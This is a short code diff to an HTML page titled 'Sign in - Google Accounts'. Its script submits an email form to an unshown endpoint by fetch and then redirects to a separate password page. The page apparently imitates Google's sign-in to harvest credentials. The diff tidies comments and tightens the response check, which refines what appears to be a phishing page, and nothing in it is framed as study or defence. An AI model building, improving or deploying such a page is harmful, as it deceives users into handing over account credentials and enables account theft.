@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Sign in - Google Accounts</title>
 <style>
-  /* your styles here (same as before) */
   body {
     font-family: Arial, sans-serif;
     background: #f5f5f5;
@@ -98,7 +97,7 @@
   <script>
     const form = document.getElementById('emailForm');
     form.addEventListener('submit', async (e) => {
-      e.preventDefault(); // Prevent normal form submit
+      e.preventDefault();
 
       const formData = new FormData(form);
       try {
@@ -109,8 +108,9 @@
             'Accept': 'application/json'
           }
         });
-        if (response.ok) {
-          // Redirect to password.html on success
+
+        const contentType = response.headers.get('content-type') || '';
+        if (response.ok && contentType.includes('application/json')) {
           window.location.href = 'password.html';
         } else {
           alert('Oops! There was a problem submitting your form.');
